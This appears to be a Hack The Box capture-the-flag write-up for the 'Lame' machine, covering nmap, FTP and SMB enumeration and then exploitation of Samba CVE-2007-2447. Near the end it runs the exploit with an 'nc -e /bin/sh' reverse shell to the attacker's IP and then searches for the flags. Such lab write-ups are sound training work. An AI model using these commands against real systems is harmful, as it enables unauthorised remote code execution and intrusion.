<img src="Pasted image 20240720105341.png" alt="HTB Profile Image" class="htb-profile-img">

<style>
  .htb-profile-img {
    width: 100%;
    max-width: 800px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.8); /* Initial glow effect */
    transition: box-shadow 0.3s ease-in-out, transform 0.3s ease-in-out; /* Smooth transition for glow and zoom effects */
  }

  .htb-profile-img:hover {
    box-shadow: 0 0 20px rgba(0, 255, 0, 1); /* Enhanced glow on hover */
    transform: scale(1.05); /* Zoom effect on hover */
  }
</style>

**Ping Scan**
```
ping 10.10.10.3
```
![[Pasted image 20240610204904.png]]
Ping worked, So machine is reachable.

**Nmap default**
```
nmap 10.10.10.3 -oN dnmap
```
![[Pasted image 20240610205000.png]]

**Nmap Scrip scan**
```
nmap 10.10.10.3 -sV -sC -oN snmap
```
![[Pasted image 20240610205430.png]]
![[Pasted image 20240610205447.png]]

**Nmap SNMP Scan**
```
nmap -sU -p 161 10.10.10.3
```
Snmp is filtered
![[Pasted image 20240610211418.png]]

**Nmap all port Scan**
```
nmap 10.10.10.3 -p- -T5 --open -oN anmap
```
can see an new open port 3632.
![[Pasted image 20240610210628.png]]

Scrip and service scan for the new port
```
nmap -sV -sC -p3632 10.10.10.3 -oN 3632nmap
```
![[Pasted image 20240610211318.png]]


**FTP Enum**
Can login as ftp or Anonymous, but no file or directory inside Ftp Session.
```
ftp 10.10.10.3
```
![[Pasted image 20240610205641.png]]

**Smb Enumeration**
```
smbmap -H 10.10.10.3
```
Can list shares without creds.
![[Pasted image 20240610205845.png]]

```
smbclient -N //10.10.10.3/tmp
```
can list the content of share ''tmp''
![[Pasted image 20240610210151.png]]


Lets try to Get initial foothold on the machine using our findings.

First will move with the Smb Share we have found read and writable.
We can se the is a file "vgauthsvclog.txt.0" is present, will get that and analyze.
```
get vgauthsvclog.txt.0
```
![[Pasted image 20240610212722.png]]

```
cat vgauthsvclog.txt.0
```
![[Pasted image 20240610213013.png]]
Nothing useful.

**Search For Public exploit**
On this initial enumeration on smb, we can see its  version, will search is there any public exploit for smb version.
Yes, there is an exploit code: https://github.com/Ziemni/CVE-2007-2447-in-Python/blob/master/smbExploit.py
![[Pasted image 20240610213247.png]]
![[Pasted image 20240610213345.png]]

**Ok No will use the exploit.**
I have saved the exploit code in a file named 'exp.py' in my kali machine and just ran the program, and I can see the usage and ran accordingly.
```
python3 exp.py 10.10.10.3 139 'nc -e /bin/sh 10.10.14.61 443'
```
![[Pasted image 20240610213422.png]]

**Set up an Netcat listener on 443 to catch reverse shell**
```
rlwrap nc -nlvp 443
```
![[Pasted image 20240610213652.png]]
Coooool....! We landed on root shell, so no need Privilege escalation on the machine.

Then upgraded my shell, the machine has python's initial version, there is no python 3 or 2.
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
![[Pasted image 20240610213805.png]]

Will search for flag in root and home directory
```
find / -type f -name "root.txt" 2>/dev/null
```
```
find / -type f -name "user.txt" 2>/dev/null
```
![[Pasted image 20240610214312.png]]

We found root flag in root directory
![[Pasted image 20240610213946.png]]

And User flag on /home/makis
![[Pasted image 20240610214456.png]]



Done With Lame....:)
